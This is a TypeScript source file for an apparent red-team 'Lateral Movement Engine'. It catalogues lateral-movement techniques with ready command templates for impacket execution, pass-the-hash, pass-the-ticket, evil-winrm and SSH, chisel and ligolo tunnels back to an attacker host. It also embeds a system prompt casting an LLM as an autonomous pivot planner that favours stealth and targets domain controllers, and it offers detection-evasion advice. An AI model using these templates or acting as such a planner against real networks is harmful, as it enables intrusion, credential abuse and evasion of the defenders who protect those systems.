/**
 * Lateral Movement Engine — LLM-Driven Pivot Planning & Technique Selection
 *
 * The LLM autonomously:
 *   - Analyzes compromised hosts and network topology to plan lateral paths
 *   - Selects optimal movement techniques based on available credentials and target OS
 *   - Assesses OPSEC risk for each movement path
 *   - Recommends tunnel/proxy configurations for pivoting
 *   - Generates step-by-step execution plans for each lateral move
 *
 * Deterministic fallback: technique matrix matching when LLM is unavailable.
 */

// ─── Technique Knowledge Base ────────────────────────────────────────────────

export interface LateralTechnique {
  id: string;
  name: string;
  attackId: string; // MITRE ATT&CK ID
  description: string;
  targetOs: ("windows" | "linux" | "macos")[];
  requiredAccess: ("user" | "admin" | "system" | "root")[];
  requiredCredentialType: ("password" | "ntlm_hash" | "kerberos_ticket" | "ssh_key" | "token" | "certificate")[];
  defaultPorts: number[];
  opsecRisk: number; // 1-10
  noiseLevel: "silent" | "low" | "moderate" | "loud" | "very_loud";
  detectionSignatures: string[];
  command_template: string;
  notes: string;
}

export const LATERAL_TECHNIQUES: LateralTechnique[] = [
  {
    id: "psexec",
    name: "PsExec (SMB)",
    attackId: "T1021.002",
    description: "Remote service creation over SMB using PsExec or Impacket's psexec.py. Creates a service binary on the target, executes it, and cleans up.",
    targetOs: ["windows"],
    requiredAccess: ["admin", "system"],
    requiredCredentialType: ["password", "ntlm_hash"],
    defaultPorts: [445, 139],
    opsecRisk: 7,
    noiseLevel: "loud",
    detectionSignatures: ["Service creation event (7045)", "Named pipe PSEXESVC", "SMB lateral movement", "Sysmon Event ID 1 (Process Create)"],
    command_template: "impacket-psexec {{domain}}/{{username}}:{{password}}@{{target}}",
    notes: "Very reliable but creates artifacts. Use smbexec for slightly less noise.",
  },
  {
    id: "smbexec",
    name: "SMBExec",
    attackId: "T1021.002",
    description: "Similar to PsExec but uses a temporary batch file instead of a service binary. Slightly stealthier.",
    targetOs: ["windows"],
    requiredAccess: ["admin", "system"],
    requiredCredentialType: ["password", "ntlm_hash"],
    defaultPorts: [445],
    opsecRisk: 6,
    noiseLevel: "moderate",
    detectionSignatures: ["SMB file write", "cmd.exe spawned by services.exe", "Temporary batch file in ADMIN$"],
    command_template: "impacket-smbexec {{domain}}/{{username}}:{{password}}@{{target}}",
    notes: "Less artifacts than PsExec. No service binary dropped.",
  },
  {
    id: "wmiexec",
    name: "WMI Execution",
    attackId: "T1047",
    description: "Remote command execution via Windows Management Instrumentation. Uses DCOM protocol.",
    targetOs: ["windows"],
    requiredAccess: ["admin"],
    requiredCredentialType: ["password", "ntlm_hash"],
    defaultPorts: [135, 445],
    opsecRisk: 5,
    noiseLevel: "moderate",
    detectionSignatures: ["WMI event subscription", "DCOM connection", "wmiprvse.exe spawning processes"],
    command_template: "impacket-wmiexec {{domain}}/{{username}}:{{password}}@{{target}}",
    notes: "Good for stealth. No service creation. Uses WMI provider host.",
  },
  {
    id: "winrm",
    name: "WinRM / PowerShell Remoting",
    attackId: "T1021.006",
    description: "Remote PowerShell execution over WinRM (HTTP/HTTPS). Native Windows admin tool.",
    targetOs: ["windows"],
    requiredAccess: ["admin"],
    requiredCredentialType: ["password", "ntlm_hash", "kerberos_ticket"],
    defaultPorts: [5985, 5986],
    opsecRisk: 3,
    noiseLevel: "low",
    detectionSignatures: ["WinRM connection event", "PowerShell remoting logs", "Event ID 4624 Type 3"],
    command_template: "evil-winrm -i {{target}} -u {{username}} -p {{password}}",
    notes: "Very stealthy — uses legitimate admin protocol. Preferred for Windows lateral movement.",
  },
  {
    id: "rdp",
    name: "Remote Desktop Protocol",
    attackId: "T1021.001",
    description: "Interactive GUI access via RDP. Useful for manual exploration but very visible.",
    targetOs: ["windows"],
    requiredAccess: ["user", "admin"],
    requiredCredentialType: ["password", "ntlm_hash"],
    defaultPorts: [3389],
    opsecRisk: 8,
    noiseLevel: "loud",
    detectionSignatures: ["Event ID 4624 Type 10", "RDP connection event", "TermService logs"],
    command_template: "xfreerdp /v:{{target}} /u:{{username}} /p:{{password}} /cert-ignore",
    notes: "Very visible. Use only when interactive access is required. Consider SharpRDP for headless.",
  },
  {
    id: "ssh",
    name: "SSH",
    attackId: "T1021.004",
    description: "Secure Shell remote access. Primary lateral movement method for Linux/Unix systems.",
    targetOs: ["linux", "macos"],
    requiredAccess: ["user", "admin", "root"],
    requiredCredentialType: ["password", "ssh_key"],
    defaultPorts: [22],
    opsecRisk: 2,
    noiseLevel: "low",
    detectionSignatures: ["SSH auth log", "New session in auth.log", "Key-based auth event"],
    command_template: "ssh {{username}}@{{target}}",
    notes: "Very stealthy with key-based auth. Standard admin tool. Preferred for Linux.",
  },
  {
    id: "pass_the_hash",
    name: "Pass-the-Hash",
    attackId: "T1550.002",
    description: "Authenticate using NTLM hash without knowing the plaintext password. Works with most SMB-based tools.",
    targetOs: ["windows"],
    requiredAccess: ["admin", "system"],
    requiredCredentialType: ["ntlm_hash"],
    defaultPorts: [445, 135],
    opsecRisk: 5,
    noiseLevel: "moderate",
    detectionSignatures: ["Event ID 4624 with NTLM auth", "Unusual NTLM authentication patterns"],
    command_template: "impacket-psexec -hashes :{{ntlm_hash}} {{domain}}/{{username}}@{{target}}",
    notes: "Core AD lateral movement technique. Combine with any SMB-based execution method.",
  },
  {
    id: "pass_the_ticket",
    name: "Pass-the-Ticket (Kerberos)",
    attackId: "T1550.003",
    description: "Use stolen Kerberos tickets (TGT or TGS) to authenticate to services without the password.",
    targetOs: ["windows"],
    requiredAccess: ["user", "admin"],
    requiredCredentialType: ["kerberos_ticket"],
    defaultPorts: [88, 445],
    opsecRisk: 4,
    noiseLevel: "low",
    detectionSignatures: ["Kerberos ticket anomalies", "Event ID 4768/4769", "Ticket encryption type mismatch"],
    command_template: "export KRB5CCNAME={{ticket_path}} && impacket-psexec -k -no-pass {{target}}",
    notes: "Very stealthy. Avoids NTLM entirely. Requires Kerberos infrastructure.",
  },
  {
    id: "overpass_the_hash",
    name: "Overpass-the-Hash",
    attackId: "T1550.002",
    description: "Convert NTLM hash to Kerberos ticket, then use Kerberos auth. Combines PtH stealth with Kerberos.",
    targetOs: ["windows"],
    requiredAccess: ["admin"],
    requiredCredentialType: ["ntlm_hash"],
    defaultPorts: [88, 445],
    opsecRisk: 4,
    noiseLevel: "low",
    detectionSignatures: ["Unusual Kerberos TGT request", "RC4 encryption in Kerberos"],
    command_template: "impacket-getTGT -hashes :{{ntlm_hash}} {{domain}}/{{username}}",
    notes: "Best of both worlds: uses hash but authenticates via Kerberos. Harder to detect than pure PtH.",
  },
  {
    id: "dcom",
    name: "DCOM Execution",
    attackId: "T1021.003",
    description: "Remote execution via Distributed COM objects (MMC20, ShellWindows, ShellBrowserWindow).",
    targetOs: ["windows"],
    requiredAccess: ["admin"],
    requiredCredentialType: ["password", "ntlm_hash"],
    defaultPorts: [135, 445],
    opsecRisk: 4,
    noiseLevel: "moderate",
    detectionSignatures: ["DCOM connection", "mmc.exe or explorer.exe spawning child processes"],
    command_template: "impacket-dcomexec {{domain}}/{{username}}:{{password}}@{{target}}",
    notes: "Less commonly monitored than PsExec/WMI. Good alternative.",
  },
  {
    id: "ssh_tunnel",
    name: "SSH Tunnel / Port Forward",
    attackId: "T1572",
    description: "Create SSH tunnels for port forwarding through compromised hosts. Enables pivoting to internal networks.",
    targetOs: ["linux", "macos"],
    requiredAccess: ["user", "admin", "root"],
    requiredCredentialType: ["password", "ssh_key"],
    defaultPorts: [22],
    opsecRisk: 2,
    noiseLevel: "silent",
    detectionSignatures: ["Long-lived SSH sessions", "Unusual port forwarding"],
    command_template: "ssh -L {{localPort}}:{{internalTarget}}:{{internalPort}} {{username}}@{{pivot}}",
    notes: "Essential for pivoting. Very stealthy. Use dynamic (-D) for SOCKS proxy.",
  },
  {
    id: "socks_proxy",
    name: "SOCKS Proxy (Dynamic SSH)",
    attackId: "T1090.001",
    description: "Create a SOCKS proxy through a compromised host to route traffic to internal networks.",
    targetOs: ["linux", "macos", "windows"],
    requiredAccess: ["user", "admin", "root"],
    requiredCredentialType: ["password", "ssh_key"],
    defaultPorts: [22],
    opsecRisk: 2,
    noiseLevel: "silent",
    detectionSignatures: ["Long-lived SSH sessions", "SOCKS traffic patterns"],
    command_template: "ssh -D {{socksPort}} {{username}}@{{pivot}}",
    notes: "Routes all tool traffic through pivot. Use with proxychains for full toolkit access.",
  },
  {
    id: "chisel",
    name: "Chisel Tunnel",
    attackId: "T1572",
    description: "HTTP-based tunneling tool. Useful when SSH is not available. Supports SOCKS proxy and port forwarding.",
    targetOs: ["linux", "windows", "macos"],
    requiredAccess: ["user", "admin", "root", "system"],
    requiredCredentialType: ["password", "ssh_key", "token"],
    defaultPorts: [8080],
    opsecRisk: 3,
    noiseLevel: "low",
    detectionSignatures: ["HTTP tunneling patterns", "Websocket connections", "Chisel binary on disk"],
    command_template: "chisel server -p {{port}} --reverse\nchisel client {{pivot}}:{{port}} R:socks",
    notes: "Great for environments where SSH is blocked. HTTP-based so blends with web traffic.",
  },
  {
    id: "ligolo",
    name: "Ligolo-ng Tunnel",
    attackId: "T1572",
    description: "Advanced tunneling tool using TUN interfaces. Provides transparent network access through pivot hosts.",
    targetOs: ["linux", "windows"],
    requiredAccess: ["admin", "root", "system"],
    requiredCredentialType: ["password", "ssh_key", "token"],
    defaultPorts: [11601],
    opsecRisk: 3,
    noiseLevel: "low",
    detectionSignatures: ["TUN interface creation", "Ligolo agent process", "Unusual network interface"],
    command_template: "ligolo-proxy -selfcert\nagent -connect {{attacker}}:11601 -ignore-cert",
    notes: "Best tunneling experience — creates a real network interface. No SOCKS/proxychains needed.",
  },
];

// ─── Pivot Planning Types ────────────────────────────────────────────────────

export interface PivotPlan {
  sourceHost: { ip: string; hostname?: string; os?: string; accessLevel: string };
  targetHost: { ip: string; hostname?: string; os?: string; port?: number };
  recommendedTechnique: LateralTechnique;
  alternativeTechniques: LateralTechnique[];
  credentialToUse: { username: string; type: string; value?: string };
  tunnelConfig?: TunnelConfig;
  executionSteps: string[];
  opsecAssessment: OpsecAssessment;
  confidence: number;
  reasoning: string;
}

export interface TunnelConfig {
  type: "ssh_local" | "ssh_dynamic" | "chisel" | "ligolo" | "port_forward";
  localPort: number;
  remoteHost: string;
  remotePort: number;
  pivotHost: string;
  command: string;
}

export interface OpsecAssessment {
  overallRisk: number;
  noiseLevel: string;
  detectionLikelihood: number;
  detectionSignatures: string[];
  mitigations: string[];
  saferAlternative?: string;
}

export interface NetworkTopology {
  hosts: { ip: string; hostname?: string; os?: string; accessLevel?: string; isCompromised: boolean; services: { port: number; service: string }[] }[];
  subnets: { cidr: string; name?: string; hosts: string[] }[];
  pivotPaths: { from: string; to: string; technique: string; status: string }[];
}

// ─── LLM System Prompt ──────────────────────────────────────────────────────

const LATERAL_SYSTEM_PROMPT = `You are the AC3 Lateral Movement Engine — an autonomous red team pivot planner.

You analyze compromised hosts, available credentials, and network topology to plan optimal lateral movement paths. Your role is to:
1. Select the best lateral movement technique for each target based on OS, available credentials, and OPSEC requirements
2. Plan tunnel/proxy configurations for pivoting through compromised hosts
3. Assess detection risk for each movement and suggest mitigations
4. Generate step-by-step execution plans
5. Identify the shortest path to high-value targets (domain controllers, databases, crown jewels)

AVAILABLE TECHNIQUES:
${LATERAL_TECHNIQUES.map(t => `- ${t.name} (${t.attackId}): ${t.description} | OS: ${t.targetOs.join("/")} | OPSEC Risk: ${t.opsecRisk}/10 | Noise: ${t.noiseLevel}`).join("\n")}

DECISION PRIORITIES:
1. OPSEC first — prefer stealthy techniques unless speed is critical
2. Use legitimate admin tools where possible (WinRM > PsExec, SSH > custom tools)
3. Prefer Kerberos over NTLM when tickets are available
4. Always plan a fallback technique
5. Consider tunnel requirements for reaching isolated subnets

OUTPUT FORMAT (JSON):
{
  "recommendedTechnique": string (technique id),
  "alternativeTechniques": string[] (technique ids),
  "executionSteps": string[],
  "tunnelRequired": boolean,
  "tunnelConfig": { "type": string, "localPort": number, "remoteHost": string, "remotePort": number, "command": string } | null,
  "opsecAssessment": { "overallRisk": number, "noiseLevel": string, "detectionLikelihood": number, "detectionSignatures": string[], "mitigations": string[], "saferAlternative": string | null },
  "confidence": number,
  "reasoning": string
}`;

// ─── Core Engine Functions ───────────────────────────────────────────────────

/**
 * Plan a lateral movement from source to target host.
 * LLM selects technique, plans tunnel, and assesses OPSEC.
 */
export async function planLateralMovement(
  sourceHost: { ip: string; hostname?: string; os?: string; accessLevel: string },
  targetHost: { ip: string; hostname?: string; os?: string; port?: number; services?: { port: number; service: string }[] },
  availableCredentials: { username: string; type: string; domain?: string }[],
  constraints?: { maxOpsecRisk?: number; preferredTechnique?: string; requireTunnel?: boolean }
): Promise<PivotPlan> {
  try {
    return await llmPlanLateralMovement(sourceHost, targetHost, availableCredentials, constraints);
  } catch (err) {
    console.warn("[LateralMovement] LLM unavailable, using deterministic fallback:", (err as Error).message);
    return deterministicPlanLateralMovement(sourceHost, targetHost, availableCredentials, constraints);
  }
}

async function llmPlanLateralMovement(
  sourceHost: { ip: string; hostname?: string; os?: string; accessLevel: string },
  targetHost: { ip: string; hostname?: string; os?: string; port?: number; services?: { port: number; service: string }[] },
  availableCredentials: { username: string; type: string; domain?: string }[],
  constraints?: { maxOpsecRisk?: number; preferredTechnique?: string; requireTunnel?: boolean }
): Promise<PivotPlan> {
  const { invokeLLM } = await import("../_core/llm");

  const response = await invokeLLM({
    messages: [
      { role: "system", content: LATERAL_SYSTEM_PROMPT },
      {
        role: "user",
        content: `PLAN LATERAL MOVEMENT:

SOURCE HOST:
- IP: ${sourceHost.ip} | Hostname: ${sourceHost.hostname || "unknown"} | OS: ${sourceHost.os || "unknown"} | Access: ${sourceHost.accessLevel}

TARGET HOST:
- IP: ${targetHost.ip} | Hostname: ${targetHost.hostname || "unknown"} | OS: ${targetHost.os || "unknown"}
- Open ports/services: ${targetHost.services?.map(s => `${s.port}/${s.service}`).join(", ") || "unknown"}

AVAILABLE CREDENTIALS:
${availableCredentials.map(c => `- ${c.username} (${c.type})${c.domain ? ` @ ${c.domain}` : ""}`).join("\n") || "None"}

CONSTRAINTS:
${constraints ? JSON.stringify(constraints) : "None — optimize for stealth"}

Select the best technique and provide your plan as JSON.`,
      },
    ],
    response_format: {
      type: "json_schema",
      json_schema: {
        name: "lateral_plan",
        strict: true,
        schema: {
          type: "object",
          properties: {
            recommendedTechnique: { type: "string" },
            alternativeTechniques: { type: "array", items: { type: "string" } },
            executionSteps: { type: "array", items: { type: "string" } },
            tunnelRequired: { type: "boolean" },
            tunnelConfig: {
              type: ["object", "null"],
              properties: {
                type: { type: "string" },
                localPort: { type: "number" },
                remoteHost: { type: "string" },
                remotePort: { type: "number" },
                command: { type: "string" },
              },
              required: ["type", "localPort", "remoteHost", "remotePort", "command"],
            },
            opsecAssessment: {
              type: "object",
              properties: {
                overallRisk: { type: "number" },
                noiseLevel: { type: "string" },
                detectionLikelihood: { type: "number" },
                detectionSignatures: { type: "array", items: { type: "string" } },
                mitigations: { type: "array", items: { type: "string" } },
                saferAlternative: { type: ["string", "null"] },
              },
              required: ["overallRisk", "noiseLevel", "detectionLikelihood", "detectionSignatures", "mitigations", "saferAlternative"],
              additionalProperties: false,
            },
            confidence: { type: "number" },
            reasoning: { type: "string" },
          },
          required: ["recommendedTechnique", "alternativeTechniques", "executionSteps", "tunnelRequired", "tunnelConfig", "opsecAssessment", "confidence", "reasoning"],
          additionalProperties: false,
        },
      },
    },
  });

  const parsed = JSON.parse(response.choices[0].message.content as string);
  const technique = LATERAL_TECHNIQUES.find(t => t.id === parsed.recommendedTechnique) || LATERAL_TECHNIQUES[0];
  const alternatives = parsed.alternativeTechniques
    .map((id: string) => LATERAL_TECHNIQUES.find(t => t.id === id))
    .filter(Boolean) as LateralTechnique[];

  return {
    sourceHost,
    targetHost,
    recommendedTechnique: technique,
    alternativeTechniques: alternatives,
    credentialToUse: availableCredentials[0] || { username: "unknown", type: "unknown" },
    tunnelConfig: parsed.tunnelConfig ? {
      ...parsed.tunnelConfig,
      pivotHost: sourceHost.ip,
    } : undefined,
    executionSteps: parsed.executionSteps,
    opsecAssessment: parsed.opsecAssessment,
    confidence: parsed.confidence,
    reasoning: parsed.reasoning,
  };
}

/**
 * Deterministic fallback — technique matrix matching.
 */
export function deterministicPlanLateralMovement(
  sourceHost: { ip: string; hostname?: string; os?: string; accessLevel: string },
  targetHost: { ip: string; hostname?: string; os?: string; port?: number; services?: { port: number; service: string }[] },
  availableCredentials: { username: string; type: string; domain?: string }[],
  constraints?: { maxOpsecRisk?: number; preferredTechnique?: string; requireTunnel?: boolean }
): PivotPlan {
  const targetOs = (targetHost.os?.toLowerCase() || "unknown") as string;
  const isWindows = targetOs.includes("windows");
  const isLinux = targetOs.includes("linux") || targetOs.includes("unix");
  const maxRisk = constraints?.maxOpsecRisk || 10;
  const credTypes = availableCredentials.map(c => c.type);

  // Filter techniques by OS, access level, credential type, and OPSEC risk
  let candidates = LATERAL_TECHNIQUES.filter(t => {
    if (t.opsecRisk > maxRisk) return false;
    if (isWindows && !t.targetOs.includes("windows")) return false;
    if (isLinux && !t.targetOs.includes("linux")) return false;
    if (!t.requiredCredentialType.some(ct => credTypes.includes(ct))) return false;
    return true;
  });

  // If preferred technique specified, prioritize it
  if (constraints?.preferredTechnique) {
    const preferred = candidates.find(t => t.id === constraints.preferredTechnique);
    if (preferred) {
      candidates = [preferred, ...candidates.filter(t => t.id !== constraints.preferredTechnique)];
    }
  }

  // Sort by OPSEC risk (lower is better)
  candidates.sort((a, b) => a.opsecRisk - b.opsecRisk);

  const technique = candidates[0] || (isWindows ? LATERAL_TECHNIQUES.find(t => t.id === "winrm")! : LATERAL_TECHNIQUES.find(t => t.id === "ssh")!);
  const alternatives = candidates.slice(1, 4);

  // Determine if tunnel is needed
  const needsTunnel = constraints?.requireTunnel || false;
  let tunnelConfig: TunnelConfig | undefined;
  if (needsTunnel) {
    tunnelConfig = {
      type: isLinux ? "ssh_dynamic" : "chisel",
      localPort: 1080,
      remoteHost: targetHost.ip,
      remotePort: technique.defaultPorts[0] || 445,
      pivotHost: sourceHost.ip,
      command: isLinux
        ? `ssh -D 1080 ${availableCredentials[0]?.username || "user"}@${sourceHost.ip}`
        : `chisel server -p 8080 --reverse`,
    };
  }

  const cred = availableCredentials[0] || { username: "unknown", type: "unknown" };
  const steps = [
    `Verify connectivity from ${sourceHost.ip} to ${targetHost.ip}:${technique.defaultPorts[0]}`,
    needsTunnel ? `Establish ${tunnelConfig!.type} tunnel through ${sourceHost.ip}` : null,
    `Prepare ${technique.name} with credentials: ${cred.username} (${cred.type})`,
    `Execute: ${technique.command_template.replace("{{target}}", targetHost.ip).replace("{{username}}", cred.username).replace("{{password}}", "***").replace("{{domain}}", availableCredentials[0]?.domain || ".")}`,
    `Verify access and enumerate local system`,
    `Document evidence and update pivot host registry`,
  ].filter(Boolean) as string[];

  return {
    sourceHost,
    targetHost,
    recommendedTechnique: technique,
    alternativeTechniques: alternatives,
    credentialToUse: cred,
    tunnelConfig,
    executionSteps: steps,
    opsecAssessment: {
      overallRisk: technique.opsecRisk,
      noiseLevel: technique.noiseLevel,
      detectionLikelihood: technique.opsecRisk * 10,
      detectionSignatures: technique.detectionSignatures,
      mitigations: [
        "Use during business hours to blend with legitimate traffic",
        "Avoid repeated failed authentication attempts",
        technique.noiseLevel === "loud" ? "Consider using a stealthier alternative" : "Current technique has acceptable noise level",
      ],
      saferAlternative: alternatives[0] ? `Consider ${alternatives[0].name} (OPSEC risk: ${alternatives[0].opsecRisk}/10)` : undefined,
    },
    confidence: 75,
    reasoning: `Selected ${technique.name} based on target OS (${targetOs}), available credential type (${cred.type}), and OPSEC constraint (max risk: ${maxRisk}).`,
  };
}

/**
 * Analyze network topology and recommend optimal pivot paths to reach a target.
 */
export async function planPivotPath(
  topology: NetworkTopology,
  startHost: string,
  targetHost: string,
  availableCredentials: { username: string; type: string; domain?: string }[]
): Promise<{ path: string[]; techniques: string[]; totalOpsecRisk: number; reasoning: string }> {
  try {
    const { invokeLLM } = await import("../_core/llm");
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `You are the AC3 Pivot Path Planner. Given a network topology, find the optimal path from a compromised host to a target host. Consider: available credentials, OPSEC risk, number of hops, and available services on each host. Return JSON: { "path": string[], "techniques": string[], "totalOpsecRisk": number, "reasoning": string }`,
        },
        {
          role: "user",
          content: `TOPOLOGY:\n${JSON.stringify(topology, null, 2)}\n\nSTART: ${startHost}\nTARGET: ${targetHost}\nCREDENTIALS: ${JSON.stringify(availableCredentials)}`,
        },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "pivot_path",
          strict: true,
          schema: {
            type: "object",
            properties: {
              path: { type: "array", items: { type: "string" } },
              techniques: { type: "array", items: { type: "string" } },
              totalOpsecRisk: { type: "number" },
              reasoning: { type: "string" },
            },
            required: ["path", "techniques", "totalOpsecRisk", "reasoning"],
            additionalProperties: false,
          },
        },
      },
    });
    return JSON.parse(response.choices[0].message.content as string);
  } catch {
    // Simple BFS fallback
    return {
      path: [startHost, targetHost],
      techniques: ["direct"],
      totalOpsecRisk: 5,
      reasoning: "Direct path (LLM unavailable for topology analysis).",
    };
  }
}

/**
 * Get all available lateral techniques filtered by criteria.
 */
export function getAvailableTechniques(filters?: {
  targetOs?: string;
  credentialType?: string;
  maxOpsecRisk?: number;
}): LateralTechnique[] {
  let techniques = [...LATERAL_TECHNIQUES];
  if (filters?.targetOs) {
    techniques = techniques.filter(t => t.targetOs.includes(filters.targetOs as any));
  }
  if (filters?.credentialType) {
    techniques = techniques.filter(t => t.requiredCredentialType.includes(filters.credentialType as any));
  }
  if (filters?.maxOpsecRisk) {
    techniques = techniques.filter(t => t.opsecRisk <= filters.maxOpsecRisk!);
  }
  return techniques;
}

/**
 * Get a specific technique by ID.
 */
export function getTechnique(id: string): LateralTechnique | undefined {
  return LATERAL_TECHNIQUES.find(t => t.id === id);
}
